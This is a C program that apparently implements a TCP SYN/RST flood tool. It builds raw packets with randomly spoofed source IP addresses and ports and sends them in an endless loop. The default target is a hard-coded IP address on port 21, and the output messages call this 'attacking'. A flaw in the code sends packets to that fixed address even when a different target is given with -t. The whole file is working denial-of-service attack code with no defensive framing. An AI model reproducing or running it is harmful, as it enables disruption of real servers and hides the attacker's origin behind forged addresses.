#include <arpa/inet.h>
#include <errno.h>
#include <getopt.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define DEFULT_IP "37.59.174.225"
#define DEFULT_PORT 21

int countOfPacket = 0;
int sending = 1;
char source_ip[32];

struct pseudo_header 
{
  unsigned int source_address;
  unsigned int dest_address;
  unsigned char placeholder;
  unsigned char protocol;
  unsigned short tcp_length;

  struct tcphdr tcp;
};


int randomPort() { return rand() % 65535; }


int randomForIp() { return rand() % 255; }


char *randomIp() {
  strcpy(source_ip, "");
  int dots = 0;
  while (dots < 3) {
    sprintf(source_ip, "%s%d", source_ip, randomForIp());
    strcat(source_ip, ".");
    fflush(NULL);
    dots++;
  }
  sprintf(source_ip, "%s%d", source_ip, randomForIp());
  strcat(source_ip, "\0");
  return source_ip;
}

int validIp(char *ip) {
  struct sockaddr_in sa;
  return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
}


void sigintHandler(int sig) {
  sending = 0;
  printf("\n%d [DATA] packets sent\n", countOfPacket);
  exit(0);
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
  register long sum;
  unsigned short oddbyte;
  register short ans;
  sum = 0;
  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }
  if (nbytes == 1) {
    oddbyte = 0;
    *((u_char *)&oddbyte) = *(u_char *)ptr;
    sum += oddbyte;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum = sum + (sum >> 16);
  ans = (short)~sum;

  return (ans);
}

int main(int argc, char *argv[]) {
  int destination_port = DEFULT_PORT;
  char destination_ip[32] = DEFULT_IP;
  int flagRst = 0;
  int flagSyn = 1;
  int opt = 0;

  srand(time(0));               
  signal(SIGINT, sigintHandler); 

  while ((opt = getopt(argc, argv, "t:p:r")) != -1) {
    switch (opt) {
    case 't':
      strcpy(destination_ip, optarg);
      if (!validIp(destination_ip)) {
        printf("[ERROR] invalid ip - Program terminated\n");
        exit(1);
      }
      break;
    case 'p':
      destination_port = strtol(optarg, NULL, 10);
      if (destination_port < 0 || destination_port > 65535) {
        printf("[ERROR] invalid port - Program terminated\n");
        exit(1);
      }
      break;
    case 'r':
      flagRst = 1;
      flagSyn = 0;
      break;
    default:
      printf("[ERROR] Program terminated\n");
      exit(1);
    }
  }
  printf("[DATA] Flood is starting...\n");

  
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

  
  char datagram[4096];

 
  struct iphdr *iph = (struct iphdr *)datagram;

  
  struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
  struct sockaddr_in sin;
  struct pseudo_header psh;

  sin.sin_addr.s_addr = inet_addr("37.59.174.225"); 
  sin.sin_port = htons(21);                     
  sin.sin_family = AF_INET;                       

  memset(datagram, 0, 4096); 

  
  iph->ihl = 5;                                             
  iph->version = 4;                                         
  iph->tos = 0;                                            
  iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
  iph->id = htons(54321);                                   
  iph->frag_off = 0;                
  iph->ttl = 255;                   
  iph->protocol = IPPROTO_TCP;      
  iph->check = 0;                   
  iph->daddr = sin.sin_addr.s_addr; 

  
  tcph->dest = htons(destination_port); 
  tcph->seq = 0;                        
  tcph->ack_seq = 0;
  tcph->doff = 5;
  tcph->fin = 0;
  tcph->syn = flagSyn;
  tcph->rst = flagRst;
  tcph->psh = 0;
  tcph->ack = 0;
  tcph->urg = 0;
  tcph->window = htons(5840); 
  tcph->urg_ptr = 0;

 
  psh.dest_address = sin.sin_addr.s_addr;
  psh.placeholder = 0;
  psh.protocol = IPPROTO_TCP;
  psh.tcp_length = htons(20);

  int one = 1;
  const int *val = &one;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
    printf("[ERROR] number : %d  Error message : %s \n", errno,
           strerror(errno));
    fprintf(stderr, "Program needs to be run by "
                    "Admin/root user\n");
    exit(1);
  }

  printf("[DATA] attacking ip %s on port %d and RST flag is %d...\n",
         destination_ip, destination_port, flagRst);

  while (sending) {
    iph->saddr = inet_addr(randomIp()); 
    iph->check = checksum((unsigned short *)datagram,
                          iph->tot_len >> 1);

    psh.source_address =
        inet_addr(source_ip); 

    tcph->source = htons(randomPort()); 
    tcph->check = 0;                   

    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

    tcph->check =
        checksum((unsigned short *)&psh,
                 sizeof(struct pseudo_header)); 
   
    if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin,
               sizeof(sin)) < 0) {
      printf("\n[ERROR] Program terminated\n");
      exit(1);
    } else {
      countOfPacket++;
    }
  }
  close(s);
  return 0;
}
